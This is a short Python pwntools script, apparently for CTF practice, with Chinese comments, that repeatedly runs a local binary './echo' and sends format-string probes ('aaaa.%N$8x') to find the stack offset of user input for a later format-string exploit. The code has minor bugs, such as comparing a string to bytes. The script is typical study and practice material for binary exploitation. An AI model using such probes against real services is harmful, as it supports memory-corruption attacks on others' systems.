from pwn import *

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')

def pianyi(pwn_name,x = 'x'):
    print('pwn_name=' + pwn_name + ',x=' + x)
    i = 0
    while True :
        r = process(pwn_name) #用来打开程序运行测试偏移
        i += 1
              # /*这里我直接发送了payload，因为不同的程序，前面可能需要接收不同的数据，
              # 所以师傅们用的时候，需要在此处加上recv进行接收数据*/
        payload = b'a'*4 + b'.' + b'%' + int2bytes(i) + b'$' + b'8x'
        r.sendline(payload)
        r.recvuntil(b"aaaa.")
        r_recv = r.recv(8)
        print(b'*'*10 + r_recv + b'*'*10)
        if r_recv == b'61616161':
            print(payload)
            if x == b'x':
                s = b'%' + int2bytes(i) + b'$8x'
            else :
                s = b'%' + int2bytes(i) + b'$8' + int2bytes(x)
            return s
            break
context(os='linux',arch='i386',log_level='debug')
binary = './echo'
pianyi(binary)